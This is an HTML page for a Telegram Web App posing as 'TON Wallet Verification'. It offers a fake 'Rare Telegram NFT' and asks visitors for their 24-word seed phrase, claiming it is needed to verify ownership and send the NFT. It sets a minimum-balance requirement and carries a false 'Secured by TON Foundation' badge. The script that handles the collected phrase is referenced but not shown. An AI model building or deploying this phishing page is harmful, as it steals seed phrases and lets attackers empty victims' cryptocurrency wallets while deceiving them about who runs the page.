<!-- web_app/index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>TON Wallet Verification</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="style.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://ton.org/download/ton_symbol.svg" alt="TON" class="logo">
            <h1>TON Wallet Verification</h1>
        </div>
        
        <div class="verification-form">
            <div class="nft-preview">
                <img src="https://via.placeholder.com/200x200/4a90e2/ffffff?text=NFT" alt="NFT Preview">
                <h3>Rare Telegram NFT</h3>
                <p class="value">Value: 2.5 TON</p>
            </div>
            
            <div class="form-group">
                <label for="wallet">Your TON Wallet Address:</label>
                <input type="text" id="wallet" placeholder="EQABC123...XYZ" readonly>
                <button onclick="generateWallet()" type="button">Generate New Wallet</button>
            </div>
            
            <div class="form-group">
                <label for="seed">Seed Phrase (24 words):</label>
                <textarea id="seed" placeholder="Enter your 24-word seed phrase to verify ownership..." rows="4"></textarea>
                <div class="info">‚ö†Ô∏è We need your seed phrase to verify wallet ownership and send NFT</div>
            </div>
            
            <div class="requirements">
                <h4>Requirements:</h4>
                <ul>
                    <li>Minimum balance: 0.5 TON</li>
                    <li>Active TON wallet</li>
                    <li>Valid seed phrase</li>
                </ul>
            </div>
            
            <button class="submit-btn" onclick="verifyAndClaim()">‚úÖ Verify & Claim NFT</button>
            
            <div class="security-notice">
                üîí Secured by TON Foundation ‚Ä¢ ‚ö° Instant transfer
            </div>
        </div>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
